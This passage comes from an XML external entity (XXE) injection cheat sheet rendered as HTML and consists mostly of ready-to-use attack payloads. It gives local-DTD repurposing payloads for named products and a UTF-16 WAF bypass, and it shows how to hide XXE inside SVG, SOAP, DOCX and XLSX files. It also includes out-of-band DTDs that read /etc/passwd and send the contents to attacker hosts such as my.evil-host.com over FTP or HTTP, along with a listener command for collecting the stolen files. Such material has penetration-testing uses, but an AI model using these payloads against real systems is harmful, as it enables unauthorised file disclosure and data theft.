+<a id="__codelineno-31-13" name="__codelineno-31-13" href="#__codelineno-31-13"></a><span class="nt">&lt;root&gt;&lt;/root&gt;</span>
+</code></pre></div>
+<h3 id="cisco-webex">Cisco WebEx</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>&lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd&quot;&gt;
+<a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>&lt;!ENTITY % url.attribute.set &#39;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&#39;&gt;
+<a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>%local_dtd;
+</code></pre></div>
+<h3 id="citrix-xenmobile-server">Citrix XenMobile Server</h3>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>&lt;!ENTITY % local_dtd SYSTEM &quot;jar:file:///opt/sas/sw/tomcat/shared/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd&quot;&gt;
+<a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>&lt;!ENTITY % Body &#39;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&#39;&gt;
+<a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>%local_dtd;
+</code></pre></div>
+<a href="https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md">Other payloads using different DTDs</a></p>
+<h2 id="waf-bypasses">WAF Bypasses</h2>
+<h3 id="bypass-via-character-encoding">Bypass via character encoding</h3>
+<p>XML parsers uses 4 methods to detect encoding:
+* HTTP Content Type: <code>Content-Type: text/xml; charset=utf-8</code>
+* Reading Byte Order Mark (BOM)
+* Reading first symbols of document 
+    * UTF-8 (3C 3F 78 6D)
+    * UTF-16BE (00 3C 00 3F)
+    * UTF-16LE (3C 00 3F 00)
+* XML declaration: <code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;</code></p>
+<table>
+<thead>
+<tr>
+<th>Encoding</th>
+<th>BOM</th>
+<th>Example</th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>UTF-8</td>
+<td>EF BB BF</td>
+<td>EF BB BF 3C 3F 78 6D 6C</td>
+<td>...&lt;?xml</td>
+</tr>
+<tr>
+<td>UTF-16BE</td>
+<td>FE FF</td>
+<td>FE FF 00 3C 00 3F 00 78 00 6D 00 6C</td>
+<td>...&lt;.?.x.m.l</td>
+</tr>
+<tr>
+<td>UTF-16LE</td>
+<td>FF FE</td>
+<td>FF FE 3C 00 3F 00 78 00 6D 00 6C 00</td>
+<td>..&lt;.?.x.m.l.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Example</strong>: We can convert the payload to <code>UTF-16</code> using <a href="https://man7.org/linux/man-pages/man1/iconv.1.html">iconv</a> to bypass some WAF:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>cat<span class="w"> </span>utf8exploit.xml<span class="w"> </span><span class="p">|</span><span class="w"> </span>iconv<span class="w"> </span>-f<span class="w"> </span>UTF-8<span class="w"> </span>-t<span class="w"> </span>UTF-16BE<span class="w"> </span>&gt;<span class="w"> </span>utf16exploit.xml
+</code></pre></div>
+<h2 id="xxe-in-java">XXE in Java</h2>
+<p>Unsecure configuration in 10 different Java classes from three XML processing interfaces (DOM, SAX, StAX) that can lead to XXE:</p>
+<p><img alt="XXE Java security features overview infographics" src="https://semgrep.dev/docs/assets/images/cheat-sheets-xxe-java-infographics-1d1d5016802e3ab8f0886b62b8c81f21.png" /></p>
+<ul>
+<li><a href="https://semgrep.dev/docs/cheat-sheets/java-xxe/#3a-documentbuilderfactory">DocumentBuilderFactory (javax.xml.parsers.DocumentBuilderFactory)</a></li>
+<li><a href="https://semgrep.dev/docs/cheat-sheets/java-xxe/#3b-saxbuilder">SAXBuilder (org.jdom2.input.SAXBuilder)</a></li>
+<li><a href="https://semgrep.dev/docs/cheat-sheets/java-xxe/#3c-saxparserfactory">SAXParserFactory (javax.xml.parsers.SAXParserFactory)</a></li>
+<li><a href="https://semgrep.dev/docs/cheat-sheets/java-xxe/#3d-saxparser">SAXParser (javax.xml.parsers.SAXParser )</a></li>
+<li><a href="https://semgrep.dev/docs/cheat-sheets/java-xxe/#3e-saxreader">SAXReader (org.dom4j.io.SAXReader)</a></li>
+<li><a href="https://semgrep.dev/docs/cheat-sheets/java-xxe/#3f-transformerfactory--saxtransformerfactory">TransformerFactory (javax.xml.transform.TransformerFactory) &amp; SAXTransformerFactory (javax.xml.transform.sax.SAXTransformerFactory)</a></li>
+<li><a href="https://semgrep.dev/docs/cheat-sheets/java-xxe/#3g-schemafactory">SchemaFactory (javax.xml.validation.SchemaFactory)</a></li>
+<li><a href="https://semgrep.dev/docs/cheat-sheets/java-xxe/#3h-validator">Validator (javax.xml.validation.Validator)</a></li>
+<li><a href="https://semgrep.dev/docs/cheat-sheets/java-xxe/#3i-xmlreader">XMLReader (org.xml.sax.XMLReader)</a></li>
+</ul>
+<p>Ref.</p>
+<ul>
+<li><a href="https://semgrep.dev/blog/2022/xml-security-in-java">Semgrep - XML Security in Java</a></li>
+<li><a href="https://semgrep.dev/docs/cheat-sheets/java-xxe/">Semgrep - XML External entity prevention for Java</a></li>
+</ul>
+<h2 id="xxe-in-exotic-files">XXE in exotic files</h2>
+<h3 id="xxe-inside-svg">XXE inside SVG</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="nt">&lt;svg</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://www.w3.org/2000/svg&quot;</span><span class="w"> </span><span class="na">xmlns:xlink=</span><span class="s">&quot;http://www.w3.org/1999/xlink&quot;</span><span class="w"> </span><span class="na">width=</span><span class="s">&quot;300&quot;</span><span class="w"> </span><span class="na">version=</span><span class="s">&quot;1.1&quot;</span><span class="w"> </span><span class="na">height=</span><span class="s">&quot;200&quot;</span><span class="nt">&gt;</span>
+<a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="w">    </span><span class="nt">&lt;image</span><span class="w"> </span><span class="na">xlink:href=</span><span class="s">&quot;expect://ls&quot;</span><span class="w"> </span><span class="na">width=</span><span class="s">&quot;200&quot;</span><span class="w"> </span><span class="na">height=</span><span class="s">&quot;200&quot;</span><span class="nt">&gt;&lt;/image&gt;</span>
+<a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a><span class="nt">&lt;/svg&gt;</span>
+</code></pre></div>
+<p><strong>Classic</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;</span>
+<a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a><span class="cp">&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot; &gt;</span><span class="w"> </span>]&gt;
+<a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a><span class="nt">&lt;svg</span><span class="w"> </span><span class="na">width=</span><span class="s">&quot;128px&quot;</span><span class="w"> </span><span class="na">height=</span><span class="s">&quot;128px&quot;</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://www.w3.org/2000/svg&quot;</span><span class="w"> </span><span class="na">xmlns:xlink=</span><span class="s">&quot;http://www.w3.org/1999/xlink&quot;</span><span class="w"> </span><span class="na">version=</span><span class="s">&quot;1.1&quot;</span><span class="nt">&gt;</span>
+<a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a><span class="w">   </span><span class="nt">&lt;text</span><span class="w"> </span><span class="na">font-size=</span><span class="s">&quot;16&quot;</span><span class="w"> </span><span class="na">x=</span><span class="s">&quot;0&quot;</span><span class="w"> </span><span class="na">y=</span><span class="s">&quot;16&quot;</span><span class="nt">&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/text&gt;</span>
+<a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a><span class="nt">&lt;/svg&gt;</span>
+</code></pre></div>
+<p><strong>OOB via SVG rasterization</strong></p>
+<p><em>xxe.svg</em></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;</span>
+<a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a><span class="cp">&lt;!DOCTYPE svg [</span>
+<a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a><span class="cp">&lt;!ELEMENT svg ANY &gt;</span>
+<a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a><span class="cp">&lt;!ENTITY % sp SYSTEM &quot;http://example.org:8080/xxe.xml&quot;&gt;</span>
+<a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a>%sp;
+<a id="__codelineno-37-6" name="__codelineno-37-6" href="#__codelineno-37-6"></a>%param1;
+<a id="__codelineno-37-7" name="__codelineno-37-7" href="#__codelineno-37-7"></a>]&gt;
+<a id="__codelineno-37-8" name="__codelineno-37-8" href="#__codelineno-37-8"></a><span class="nt">&lt;svg</span><span class="w"> </span><span class="na">viewBox=</span><span class="s">&quot;0 0 200 200&quot;</span><span class="w"> </span><span class="na">version=</span><span class="s">&quot;1.2&quot;</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://www.w3.org/2000/svg&quot;</span><span class="w"> </span><span class="na">style=</span><span class="s">&quot;fill:red&quot;</span><span class="nt">&gt;</span>
+<a id="__codelineno-37-9" name="__codelineno-37-9" href="#__codelineno-37-9"></a><span class="w">      </span><span class="nt">&lt;text</span><span class="w"> </span><span class="na">x=</span><span class="s">&quot;15&quot;</span><span class="w"> </span><span class="na">y=</span><span class="s">&quot;100&quot;</span><span class="w"> </span><span class="na">style=</span><span class="s">&quot;fill:black&quot;</span><span class="nt">&gt;</span>XXE<span class="w"> </span>via<span class="w"> </span>SVG<span class="w"> </span>rasterization<span class="nt">&lt;/text&gt;</span>
+<a id="__codelineno-37-10" name="__codelineno-37-10" href="#__codelineno-37-10"></a><span class="w">      </span><span class="nt">&lt;rect</span><span class="w"> </span><span class="na">x=</span><span class="s">&quot;0&quot;</span><span class="w"> </span><span class="na">y=</span><span class="s">&quot;0&quot;</span><span class="w"> </span><span class="na">rx=</span><span class="s">&quot;10&quot;</span><span class="w"> </span><span class="na">ry=</span><span class="s">&quot;10&quot;</span><span class="w"> </span><span class="na">width=</span><span class="s">&quot;200&quot;</span><span class="w"> </span><span class="na">height=</span><span class="s">&quot;200&quot;</span><span class="w"> </span><span class="na">style=</span><span class="s">&quot;fill:pink;opacity:0.7&quot;</span><span class="nt">/&gt;</span>
+<a id="__codelineno-37-11" name="__codelineno-37-11" href="#__codelineno-37-11"></a><span class="w">      </span><span class="nt">&lt;flowRoot</span><span class="w"> </span><span class="na">font-size=</span><span class="s">&quot;15&quot;</span><span class="nt">&gt;</span>
+<a id="__codelineno-37-12" name="__codelineno-37-12" href="#__codelineno-37-12"></a><span class="w">         </span><span class="nt">&lt;flowRegion&gt;</span>
+<a id="__codelineno-37-13" name="__codelineno-37-13" href="#__codelineno-37-13"></a><span class="w">           </span><span class="nt">&lt;rect</span><span class="w"> </span><span class="na">x=</span><span class="s">&quot;0&quot;</span><span class="w"> </span><span class="na">y=</span><span class="s">&quot;0&quot;</span><span class="w"> </span><span class="na">width=</span><span class="s">&quot;200&quot;</span><span class="w"> </span><span class="na">height=</span><span class="s">&quot;200&quot;</span><span class="w"> </span><span class="na">style=</span><span class="s">&quot;fill:red;opacity:0.3&quot;</span><span class="nt">/&gt;</span>
+<a id="__codelineno-37-14" name="__codelineno-37-14" href="#__codelineno-37-14"></a><span class="w">         </span><span class="nt">&lt;/flowRegion&gt;</span>
+<a id="__codelineno-37-15" name="__codelineno-37-15" href="#__codelineno-37-15"></a><span class="w">         </span><span class="nt">&lt;flowDiv&gt;</span>
+<a id="__codelineno-37-16" name="__codelineno-37-16" href="#__codelineno-37-16"></a><span class="w">            </span><span class="nt">&lt;flowPara&gt;</span><span class="ni">&amp;exfil;</span><span class="nt">&lt;/flowPara&gt;</span>
+<a id="__codelineno-37-17" name="__codelineno-37-17" href="#__codelineno-37-17"></a><span class="w">         </span><span class="nt">&lt;/flowDiv&gt;</span>
+<a id="__codelineno-37-18" name="__codelineno-37-18" href="#__codelineno-37-18"></a><span class="w">      </span><span class="nt">&lt;/flowRoot&gt;</span>
+<a id="__codelineno-37-19" name="__codelineno-37-19" href="#__codelineno-37-19"></a><span class="nt">&lt;/svg&gt;</span>
+</code></pre></div>
+<p><em>xxe.xml</em></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="cp">&lt;!ENTITY % data SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/hostname&quot;&gt;</span>
+<a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a><span class="cp">&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM &#39;ftp://example.org:2121/%data;&#39;&gt;</span>&quot;&gt;
+</code></pre></div>
+<h3 id="xxe-inside-soap">XXE inside SOAP</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="nt">&lt;soap:Body&gt;</span>
+<a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a><span class="w">  </span><span class="nt">&lt;foo&gt;</span>
+<a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a><span class="w">    </span><span class="cp">&lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM &quot;http://x.x.x.x:22/&quot;&gt; %dtd;]&gt;&lt;xxx/&gt;]]&gt;</span>
+<a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a><span class="w">  </span><span class="nt">&lt;/foo&gt;</span>
+<a id="__codelineno-39-5" name="__codelineno-39-5" href="#__codelineno-39-5"></a><span class="nt">&lt;/soap:Body&gt;</span>
+</code></pre></div>
+<h3 id="xxe-inside-docx-file">XXE inside DOCX file</h3>
+<p>Format of an Open XML file (inject the payload in any .xml file):</p>
+<ul>
+<li>/_rels/.rels</li>
+<li>[Content_Types].xml</li>
+<li>Default Main Document Part</li>
+<li>/word/document.xml</li>
+<li>/ppt/presentation.xml</li>
+<li>/xl/workbook.xml</li>
+</ul>
+<p>Then update the file <code>zip -u xxe.docx [Content_Types].xml</code></p>
+<p>Tool : https://github.com/BuffaloWill/oxml_xxe</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>DOCX/XLSX/PPTX
+<a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>ODT/ODG/ODP/ODS
+<a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a>SVG
+<a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a>XML
+<a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a>PDF<span class="w"> </span>(experimental)
+<a id="__codelineno-40-6" name="__codelineno-40-6" href="#__codelineno-40-6"></a>JPG<span class="w"> </span>(experimental)
+<a id="__codelineno-40-7" name="__codelineno-40-7" href="#__codelineno-40-7"></a>GIF<span class="w"> </span>(experimental)
+</code></pre></div>
+<h3 id="xxe-inside-xlsx-file">XXE inside XLSX file</h3>
+<p>Structure of the XLSX:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>$ 7z l xxe.xlsx
+<a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a>[...]
+<a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a>   Date      Time    Attr         Size   Compressed  Name
+<a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a>------------------- ----- ------------ ------------  ------------------------
+<a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a>2021-10-17 15:19:00 .....          578          223  _rels/.rels
+<a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a>2021-10-17 15:19:00 .....          887          508  xl/workbook.xml
+<a id="__codelineno-41-7" name="__codelineno-41-7" href="#__codelineno-41-7"></a>2021-10-17 15:19:00 .....         4451          643  xl/styles.xml
+<a id="__codelineno-41-8" name="__codelineno-41-8" href="#__codelineno-41-8"></a>2021-10-17 15:19:00 .....         2042          899  xl/worksheets/sheet1.xml
+<a id="__codelineno-41-9" name="__codelineno-41-9" href="#__codelineno-41-9"></a>2021-10-17 15:19:00 .....          549          210  xl/_rels/workbook.xml.rels
+<a id="__codelineno-41-10" name="__codelineno-41-10" href="#__codelineno-41-10"></a>2021-10-17 15:19:00 .....          201          160  xl/sharedStrings.xml
+<a id="__codelineno-41-11" name="__codelineno-41-11" href="#__codelineno-41-11"></a>2021-10-17 15:19:00 .....          731          352  docProps/core.xml
+<a id="__codelineno-41-12" name="__codelineno-41-12" href="#__codelineno-41-12"></a>2021-10-17 15:19:00 .....          410          246  docProps/app.xml
+<a id="__codelineno-41-13" name="__codelineno-41-13" href="#__codelineno-41-13"></a>2021-10-17 15:19:00 .....         1367          345  [Content_Types].xml
+<a id="__codelineno-41-14" name="__codelineno-41-14" href="#__codelineno-41-14"></a>------------------- ----- ------------ ------------  ------------------------
+<a id="__codelineno-41-15" name="__codelineno-41-15" href="#__codelineno-41-15"></a>2021-10-17 15:19:00              11216         3586  9 files
+</code></pre></div>
+<p>Extract Excel file: <code>7z x -oXXE xxe.xlsx</code></p>
+<p>Rebuild Excel file:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>$ cd XXE
+<a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>$ 7z u ../xxe.xlsx *
+</code></pre></div>
+<p>Add your blind XXE payload inside <code>xl/workbook.xml</code>.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span>
+<a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a><span class="cp">&lt;!DOCTYPE cdl [&lt;!ELEMENT cdl ANY &gt;&lt;!ENTITY % asd SYSTEM &quot;http://x.x.x.x:8000/xxe.dtd&quot;&gt;</span>%asd;%c;]&gt;
+<a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a><span class="nt">&lt;cdl&gt;</span><span class="ni">&amp;rrr;</span><span class="nt">&lt;/cdl&gt;</span>
+<a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a><span class="nt">&lt;workbook</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://schemas.openxmlformats.org/spreadsheetml/2006/main&quot;</span><span class="w"> </span><span class="na">xmlns:r=</span><span class="s">&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships&quot;</span><span class="nt">&gt;</span>
+</code></pre></div>
+<p>Alternativly, add your payload in <code>xl/sharedStrings.xml</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span>
+<a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a><span class="cp">&lt;!DOCTYPE cdl [&lt;!ELEMENT t ANY &gt;&lt;!ENTITY % asd SYSTEM &quot;http://x.x.x.x:8000/xxe.dtd&quot;&gt;</span>%asd;%c;]&gt;
+<a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a><span class="nt">&lt;sst</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://schemas.openxmlformats.org/spreadsheetml/2006/main&quot;</span><span class="w"> </span><span class="na">count=</span><span class="s">&quot;10&quot;</span><span class="w"> </span><span class="na">uniqueCount=</span><span class="s">&quot;10&quot;</span><span class="nt">&gt;&lt;si&gt;&lt;t&gt;</span><span class="ni">&amp;rrr;</span><span class="nt">&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testA2<span class="nt">&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testA3<span class="nt">&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testA4<span class="nt">&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testA5<span class="nt">&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testB1<span class="nt">&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testB2<span class="nt">&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testB3<span class="nt">&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testB4<span class="nt">&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;</span>testB5<span class="nt">&lt;/t&gt;&lt;/si&gt;&lt;/sst&gt;</span>
+</code></pre></div>
+<p>Using a remote DTD will save us the time to rebuild a document each time we want to retrieve a different file.
+Instead we build the document once and then change the DTD.
+And using FTP instead of HTTP allows to retrieve much larger files.</p>
+<p><code>xxe.dtd</code></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="cp">&lt;!ENTITY % d SYSTEM &quot;file:///etc/passwd&quot;&gt;</span>
+<a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a><span class="cp">&lt;!ENTITY % c &quot;&lt;!ENTITY rrr SYSTEM &#39;ftp://x.x.x.x:2121/%d;&#39;&gt;</span>&quot;&gt;<span class="w"> </span>
+</code></pre></div>
+<p>Serve DTD and receive FTP payload using <a href="https://github.com/staaldraad/xxeserv">xxeserv</a>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>$ xxeserv -o files.log -p 2121 -w -wd public -wp 8000
+</code></pre></div>
+<h3 id="xxe-inside-dtd-file">XXE inside DTD file</h3>
+<p>Most XXE payloads detailed above require control over both the DTD or <code>DOCTYPE</code> block as well as the <code>xml</code> file.
+In rare situations, you may only control the DTD file and won't be able to modify the <code>xml</code> file. For example, a MITM.
+When all you control is the DTD file, and you do not control the <code>xml</code> file, XXE may still be possible with this payload.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a><span class="cm">&lt;!-- Load the contents of a sensitive file into a variable --&gt;</span>
+<a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a><span class="cp">&lt;!ENTITY % payload SYSTEM &quot;file:///etc/passwd&quot;&gt;</span>
+<a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a><span class="cm">&lt;!-- Use that variable to construct an HTTP get request with the file contents in the URL --&gt;</span>
+<a id="__codelineno-47-4" name="__codelineno-47-4" href="#__codelineno-47-4"></a><span class="cp">&lt;!ENTITY % param1 &#39;&lt;!ENTITY &amp;#37; external SYSTEM &quot;http://my.evil-host.com/x=%payload;&quot;&gt;</span>&#39;&gt;
+<a id="__codelineno-47-5" name="__codelineno-47-5" href="#__codelineno-47-5"></a>%param1;
+<a id="__codelineno-47-6" name="__codelineno-47-6" href="#__codelineno-47-6"></a>%external;
+</code></pre></div>
+<h2 id="windows-local-dtd-and-side-channel-leak-to-disclose-http-responsefile-contents">Windows Local DTD and Side Channel Leak to disclose HTTP response/file contents</h2>
+<p>From https://gist.github.com/infosec-au/2c60dc493053ead1af42de1ca3bdcc79</p>
+<h3 id="disclose-local-file">Disclose local file</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="cp">&lt;!DOCTYPE doc [</span>
+<a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a><span class="cp">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///C:\Windows\System32\wbem\xml\cim20.dtd&quot;&gt;</span>
+<a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a><span class="w">    </span><span class="cp">&lt;!ENTITY % SuperClass &#39;&gt;</span>
+<a id="__codelineno-48-4" name="__codelineno-48-4" href="#__codelineno-48-4"></a><span class="w">        </span><span class="cp">&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file://D:\webserv2\services\web.config&quot;&gt;</span>
+<a id="__codelineno-48-5" name="__codelineno-48-5" href="#__codelineno-48-5"></a><span class="w">        </span><span class="cp">&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file://t/#&amp;#x25;file;&amp;#x27;&gt;</span>&quot;&gt;
+<a id="__codelineno-48-6" name="__codelineno-48-6" href="#__codelineno-48-6"></a><span class="w">        </span><span class="ni">&amp;#x25;</span>eval;
+<a id="__codelineno-48-7" name="__codelineno-48-7" href="#__codelineno-48-7"></a><span class="w">        </span><span class="ni">&amp;#x25;</span>error;
+<a id="__codelineno-48-8" name="__codelineno-48-8" href="#__codelineno-48-8"></a><span class="w">      </span><span class="cp">&lt;!ENTITY test &quot;test&quot;&#39;</span>
+<a id="__codelineno-48-9" name="__codelineno-48-9" href="#__codelineno-48-9"></a><span class="cp">    &gt;</span>
+<a id="__codelineno-48-10" name="__codelineno-48-10" href="#__codelineno-48-10"></a><span class="w">    </span>%local_dtd;
+<a id="__codelineno-48-11" name="__codelineno-48-11" href="#__codelineno-48-11"></a><span class="w">  </span>]&gt;<span class="nt">&lt;xxx&gt;</span>cacat<span class="nt">&lt;/xxx&gt;</span>
+</code></pre></div>
+<h3 id="disclose-http-response">Disclose HTTP Response:</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="cp">&lt;!DOCTYPE doc [</span>
+<a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a><span class="cp">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///C:\Windows\System32\wbem\xml\cim20.dtd&quot;&gt;</span>
+<a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a><span class="w">    </span><span class="cp">&lt;!ENTITY % SuperClass &#39;&gt;</span>
+<a id="__codelineno-49-4" name="__codelineno-49-4" href="#__codelineno-49-4"></a><span class="w">        </span><span class="cp">&lt;!ENTITY &amp;#x25; file SYSTEM &quot;https://erp.company.com&quot;&gt;</span>
+<a id="__codelineno-49-5" name="__codelineno-49-5" href="#__codelineno-49-5"></a><span class="w">        </span><span class="cp">&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file://test/#&amp;#x25;file;&amp;#x27;&gt;</span>&quot;&gt;
+<a id="__codelineno-49-6" name="__codelineno-49-6" href="#__codelineno-49-6"></a><span class="w">        </span><span class="ni">&amp;#x25;</span>eval;
+<a id="__codelineno-49-7" name="__codelineno-49-7" href="#__codelineno-49-7"></a><span class="w">        </span><span class="ni">&amp;#x25;</span>error;
+<a id="__codelineno-49-8" name="__codelineno-49-8" href="#__codelineno-49-8"></a><span class="w">      </span><span class="cp">&lt;!ENTITY test &quot;test&quot;&#39;</span>
+<a id="__codelineno-49-9" name="__codelineno-49-9" href="#__codelineno-49-9"></a><span class="cp">    &gt;</span>
+<a id="__codelineno-49-10" name="__codelineno-49-10" href="#__codelineno-49-10"></a><span class="w">    </span>%local_dtd;
+<a id="__codelineno-49-11" name="__codelineno-49-11" href="#__codelineno-49-11"></a><span class="w">  </span>]&gt;<span class="nt">&lt;xxx&gt;</span>cacat<span class="nt">&lt;/xxx&gt;</span>
+</code></pre></div>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing">XML External Entity (XXE) Processing - OWASP</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">XML External Entity Prevention Cheat Sheet</a></li>
+<li><a href="http://web-in-security.blogspot.fr/2014/11/detecting-and-exploiting-xxe-in-saml.html">Detecting and exploiting XXE in SAML Interfaces</a> - 6. Nov. 2014 - Von Christian Mainka</li>
+<li><a href="https://gist.github.com/staaldraad/01415b990939494879b4">[Gist] staaldraad - XXE payloads</a></li>
+<li><a href="https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870">[Gist] mgeeky - XML attacks</a></li>
+<li><a href="https://www.blackhat.com/docs/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.pdf">Exploiting xxe in file upload functionality - BLACKHAT WEBCAST - 11/19/15 - Will Vandevanter - @<em>will_is</em></a></li>
